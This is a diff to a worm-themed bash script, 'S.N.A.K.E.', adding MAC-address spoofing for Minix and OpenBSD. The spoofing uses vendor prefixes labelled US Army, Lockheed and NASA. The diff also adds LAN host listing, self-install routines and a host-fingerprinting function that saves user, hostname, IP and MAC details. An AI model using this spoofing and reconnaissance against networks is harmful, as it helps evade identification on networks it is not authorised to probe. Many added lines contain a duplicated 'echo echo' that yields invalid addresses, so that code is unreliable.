@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-_version="0.3.8"
+_version="0.4.0"
 _name="S.N.A.K.E."
 _morph_state="Unknown"
 
@@ -106,6 +106,16 @@ else
 printf "$WHITE Samsung :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo 38:2D:E8:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo 38:2D:E8:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -148,6 +158,16 @@ _lg(){
   else
   printf "$WHITE LG :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
   fi
+
+  elif [[ $_system == "Minix" ]]; then
+
+    sudo ip link set dev enp0s3 down
+    sudo ip link set dev enp0s3 address $(echo 2C:54:CF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+    sudo ip link set dev enp0s3 up
+
+  elif [[ $_system == "OpenBSD" ]]; then
+
+    ifconfig em0 lladdr $(echo 2C:54:CF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
   else
 
@@ -199,6 +219,16 @@ _apple(){
   else
   printf "$WHITE Apple :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
   fi
+
+  elif [[ $_system == "Minix" ]]; then
+
+    sudo ip link set dev enp0s3 down
+    sudo ip link set dev enp0s3 address $(echo DC:A9:04:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+    sudo ip link set dev enp0s3 up
+
+  elif [[ $_system == "OpenBSD" ]]; then
+
+    ifconfig em0 lladdr $(echo DC:A9:04:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
   else
 
@@ -261,6 +291,16 @@ else
 printf "$WHITE Oppo :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo 50:29:F5:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo 50:29:F5:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "$RED Not available on this system$NC\n"
@@ -299,6 +339,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE One Plus :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo C0:EE:FB:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo C0:EE:FB:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -340,6 +390,16 @@ else
 printf "$WHITE Huawei :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo 78:F5:FD:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo 78:F5:FD:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -380,6 +440,16 @@ else
 printf "$WHITE Xperia :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo 1C:7B:21:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo 1C:7B:21:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -418,6 +488,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE Yota :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo 28:C6:71:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo 28:C6:71:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -459,6 +539,16 @@ else
 printf "$WHITE Lumia :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo 38:F2:3E:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo 38:F2:3E:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -498,6 +588,16 @@ else
 printf "$WHITE Nokia :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo A4:81:EE:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo A4:81:EE:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -536,6 +636,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE HTC :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo 80:7A:BF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo 80:7A:BF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -577,6 +687,16 @@ else
 printf "$WHITE Xiaomi :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo F8:A4:5F:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo F8:A4:5F:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -616,6 +736,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE HP :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo 3C:D9:2B:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo 3C:D9:2B:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -657,6 +787,16 @@ else
 printf "$WHITE Dell :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo F8:DB:88:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo F8:DB:88:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -696,6 +836,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE IBM :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 6C:AE:8B:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 6C:AE:8B:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -737,6 +887,16 @@ else
 printf "$WHITE Microsoft :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 48:50:73:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 48:50:73:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -776,6 +936,16 @@ else
 printf "$WHITE Lenovo :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 70:72:0D:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 70:72:0D:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -814,6 +984,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE Intel :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 2C:6E:85:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 2C:6E:85:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -855,6 +1035,16 @@ else
 printf "$WHITE AMD :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 00:0C:87:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 00:0C:87:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -894,6 +1084,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE Nvidia :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 00:04:4B:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 00:04:4B:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -935,6 +1135,16 @@ else
 printf "$WHITE Tesla :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 98:ED:5C:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 98:ED:5C:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -973,6 +1183,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE Microsoft :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 00:11:BD:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 00:11:BD:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -1024,6 +1244,16 @@ else
 printf "$WHITE Boeing :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 00:50:93:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 00:50:93:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -1065,6 +1295,16 @@ else
 printf "$WHITE Lockheed :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 00:07:EF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 00:07:EF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -1104,6 +1344,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE Airbus :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 00:23:B9:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 00:23:B9:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -1145,6 +1395,16 @@ else
 printf "$WHITE Northrop :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 00:19:8A:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 00:19:8A:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -1185,6 +1445,16 @@ else
 printf "$WHITE BAE :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo CC:3F:EA:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo CC:3F:EA:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -1224,6 +1494,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE US Army :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 00:C0:ED:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 00:C0:ED:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -1266,6 +1546,16 @@ else
 printf "$WHITE Toyota :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 00:0A:AB:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 00:0A:AB:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -1307,6 +1597,16 @@ else
 printf "$WHITE Porsche :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
 
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo D0:0E:A4:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo D0:0E:A4:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
 else
 
  printf "Not available on this system\n"
@@ -1344,6 +1644,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE Parrot :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo A0:14:3D:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo A0:14:3D:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -1384,6 +1694,16 @@ if [ "$1" == "-q" ]; then
 else
 printf "$WHITE NASA :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
 fi
+
+elif [[ $_system == "Minix" ]]; then
+
+  sudo ip link set dev enp0s3 down
+  sudo ip link set dev enp0s3 address $(echo echo 00:08:55:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+  sudo ip link set dev enp0s3 up
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  ifconfig em0 lladdr $(echo echo 00:08:55:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
 else
 
@@ -1473,14 +1793,27 @@ _linux(){
 
 _haiku(){
      echo "Haiku spreading..."
+
+     pkgman install speedtest_cli -y >/dev/null
 }
 
 _bsd(){
-     echo "BSD spreading..."
+     echo " OpenBSD spreading..."
 }
 
 _minix(){
+
      echo "Minix spreading..."
+
+     pkgin install htop -y
+
+     pkgin install curl -y
+
+     pkgin install ipcalc -y
+
+     pkgin install git-base -y
+
+
 }
 
 _unknown(){
@@ -1533,9 +1866,9 @@ _people(){
     elif [[ $_system == "BSD" ]]; then
        sudo arp-scan -l | sed '1,2d' | sed '$d' | sed '$d' | sed '$d' | sed '$d'
     elif [[ $_system == "Minix" ]]; then
-       sudo arp-scan -l | sed '1,2d' | sed '$d' | sed '$d' | sed '$d' | sed '$d'
+       arp -a
     elif [[ $_system == "Haiku" ]]; then
-       sudo arp-scan -l | sed '1,2d' | sed '$d' | sed '$d' | sed '$d' | sed '$d'
+       arp -a | awk '{print $1,$3,$2}'
     elif [[ $_system == "$(uname -n)" ]]; then   #UNIX
        sudo arp-scan -l | sed '1,2d' | sed '$d' | sed '$d' | sed '$d' | sed '$d'
     else
@@ -1556,7 +1889,7 @@ _myself(){
   elif [[ $_system == "BSD" ]]; then
       printf "Not available on your OS$NC\n"
   elif [[ $_system == "Minix" ]]; then
-      printf "Not available on your OS$NC\n"
+      printf "Local IP -> $(ifconfig | grep \/dev\/ip | awk '{print $3}')\n"
   elif [[ $_system == "Haiku" ]]; then
       printf "Not available on your OS$NC\n"
   elif [[ $_system == "$(uname -n)" ]]; then   #UNIX
@@ -1928,9 +2261,34 @@ _reveal(){
 
 _exec(){
 
-  sudo chmod +x snake
-  sudo cp snake /usr/local/bin/
-  printf "$RED _nested$NC \n"
+
+
+
+    _system="$(uname -s)"
+
+  if [ $_system == "Darwin" ]; then
+    sudo chmod +x snake
+    sudo cp snake /usr/local/bin/
+    printf "$RED _nested$NC \n"
+  elif [[ $_system == "Linux" ]]; then
+    sudo chmod +x snake
+    sudo cp snake /usr/local/bin/
+    printf "$RED _nested$NC \n"
+  elif [[ $_system == "Haiku" ]]; then
+       chmod +x snake
+       #sudo cp snake /usr/local/bin/
+       printf "$RED _nested$NC \n"
+  elif [[ $_system == "OpenBSD" ]]; then
+    sudo chmod +x snake
+    sudo cp snake /usr/local/bin/
+    printf "$RED _nested$NC \n"
+  elif [[ $_system == "Minix" ]]; then
+    chmod +x snake
+    cp snake /usr/local/bin/
+    printf "$RED _nested$NC \n"
+  else
+     printf "$RED Not for your system$NC\n"
+  fi
 
 }
 
@@ -1969,6 +2327,67 @@ fi
 
 }
 
+
+
+
+_exec_q(){
+
+
+  _system="$(uname -s)"
+
+if [ $_system == "Darwin" ]; then
+   sudo chmod +x snake
+   sudo cp snake /usr/local/bin/
+elif [[ $_system == "Linux" ]]; then
+   sudo chmod +x snake
+   sudo cp snake /usr/local/bin/
+elif [[ $_system == "Haiku" ]]; then
+   chmod +x snake
+   cp snake /bin
+elif [[ $_system == "BSD" ]]; then
+   sudo chmod +x snake
+   sudo cp snake /usr/local/bin/
+elif [[ $_system == "Minix" ]]; then
+   sudo chmod +x snake
+   sudo cp snake /usr/local/bin/
+else
+   printf "$RED Not for your system$NC\n"
+fi
+
+
+
+
+}
+
+_exec_u(){
+
+
+  _system="$(uname -s)"
+
+if [ $_system == "Darwin" ]; then
+   sudo chmod -x snake
+   sudo rm -rf /usr/local/bin/snake
+elif [[ $_system == "Linux" ]]; then
+   sudo chmod -x snake
+   sudo rm -rf /usr/local/bin/snake
+elif [[ $_system == "Haiku" ]]; then
+   chmod +x snake
+   rm -rf /bin/snake
+elif [[ $_system == "BSD" ]]; then
+   sudo chmod -x snake
+   sudo rm -rf /usr/local/bin/snake
+elif [[ $_system == "Minix" ]]; then
+   sudo chmod -x snake
+   sudo rm -rf /usr/local/bin/snake
+else
+   printf "$RED Not for your system$NC\n"
+fi
+
+
+
+
+}
+
 _appID(){
 
     ps -A | grep -m1 "$1" | awk '{print $1}'
@@ -1977,26 +2396,129 @@ _appID(){
 
 _snap(){
 
-    _cheese
-    touch $HOME/.snake/snake.json
-    echo "{\"$(date)\":{" >> snake.json
-    echo "   \"ID\":1024," >> snake.json
-    echo "   \"Race\":\"Salazaar\"," >> snake.json
-    echo "   \"Username\":\"$USER\"," >> snake.json
-    echo "   \"Homepath\":\"$HOME\"," >> snake.json
-    echo "   \"Nestname\":\"$(hostname)\"," >> snake.json
-    echo "   \"Shell\":\"$SHELL\"," >> snake.json
-    echo "   \"InternalIP\":\"$(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}')\"," >> snake.json
-    echo "   \"Mac\":\"$(ipconfig getpacket en0 | grep chaddr | awk '{print $3;}')\"," >> snake.json
-    echo "   \"Architecture\":\"$(uname -m)\"," >> snake.json
-    echo "   \"OS\":\"$(uname -s)\"," >> snake.json
-    echo "   \"KernelVersion\":\"$(uname -r)\"," >> snake.json
-    echo "   \"VSpawn\":\"$(date)\"," >> snake.json
-    echo "   \"Control\":false," >> snake.json
-    echo "   \"Heat\":0," >> snake.json
-    echo "   \"Task\":\"Monitor\"," >> snake.json
-    echo "   }," >> snake.json
-    echo " }  " >> snake.json
+
+           _system="$(uname -s)"
+
+           if [ $_system == "Darwin" ]; then
+
+             _cheese
+             touch $HOME/.snake/snake.json
+             echo "{\"$(date)\":{" >> snake.json
+             echo "   \"ID\":1024," >> snake.json
+             echo "   \"Race\":\"Salazaar\"," >> snake.json
+             echo "   \"Username\":\"$USER\"," >> snake.json
+             echo "   \"Homepath\":\"$HOME\"," >> snake.json
+             echo "   \"Nestname\":\"$(hostname)\"," >> snake.json
+             echo "   \"Shell\":\"$SHELL\"," >> snake.json
+             echo "   \"InternalIP\":\"$(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}')\"," >> snake.json
+             echo "   \"Mac\":\"$(ipconfig getpacket en0 | grep chaddr | awk '{print $3;}')\"," >> snake.json
+             echo "   \"Architecture\":\"$(uname -m)\"," >> snake.json
